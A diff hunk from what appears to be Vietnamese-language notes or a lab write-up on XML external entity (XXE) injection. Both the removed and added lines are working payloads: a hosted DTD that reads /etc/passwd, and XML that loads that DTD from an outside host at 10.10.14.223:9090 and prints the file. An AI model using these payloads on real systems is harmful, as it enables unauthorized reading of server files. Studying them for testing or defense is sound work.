@@ -154,22 +154,18 @@ When you can't modify the **DOCTYPE** element use the **XInclude** to target
 Mục tiêu là khai báo một entity ở file dtd lưu trên server:
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents 
-'%start;%file;%end;'>">
+<!ENTITY % all "<!ENTITY data SYSTEM 'file:///etc/passwd'>">
+%all;
 ```
 Payload submit sẽ sử dụng entity mình khai báo rồi hiển thị ra màn hình
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE a [
-  <!ENTITY % dtd SYSTEM
-  "http://10.10.14.223:9090/xxe.dtd">
-  %dtd;
-  %all;
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://10.10.14.223:9090/xxe.dtd">
+  %remote;
 ]>
 <root>
-<email>&fileContents;</email>
+<email>&data;</email>
 </root>
 ```
 
